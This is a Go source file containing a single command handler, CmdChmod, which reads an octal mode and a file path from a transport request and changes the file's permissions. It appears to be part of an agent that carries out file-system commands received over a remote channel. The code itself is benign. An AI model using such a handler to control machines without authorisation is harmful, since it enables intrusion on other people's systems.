package fs

import (
	"errors"
	"github.com/pygrum/Empress/transport"
	"os"
	"strconv"
)

func CmdChmod(req *transport.Request, response *transport.Response) {
	mode, err := strconv.ParseUint(string(req.Args[0]), 8, 32) // File modes are octal not decimal
	if err != nil {
		transport.ResponseWithError(response, errors.New("invalid file mode"))
		return
	}
	file := string(req.Args[1])
	if err = os.Chmod(file, os.FileMode(mode)); err != nil {
		transport.ResponseWithError(response, err)
		return
	}
	transport.AddResponse(response, transport.ResponseDetail{
		Status: transport.StatusSuccess,
		Dest:   transport.DestNone,
	})
}
